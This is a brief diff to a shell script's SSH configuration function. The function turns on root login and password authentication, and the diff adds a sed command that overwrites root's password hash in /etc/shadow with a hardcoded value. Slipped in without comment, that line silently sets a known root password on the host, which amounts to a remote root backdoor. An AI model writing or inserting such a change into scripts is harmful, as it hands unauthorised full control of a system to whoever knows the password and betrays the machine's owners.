@@ -90,5 +90,6 @@ function ssh_PermitRootLogin() {
   fi
   sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
   sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+  sed -i 's?root:.*?root:$1$1EVxrKHq$LVrzAq08KuFRHHiy9JAe51:19089:0:99999:7:::?g' /etc/shadow
 }
 system_check "$@"
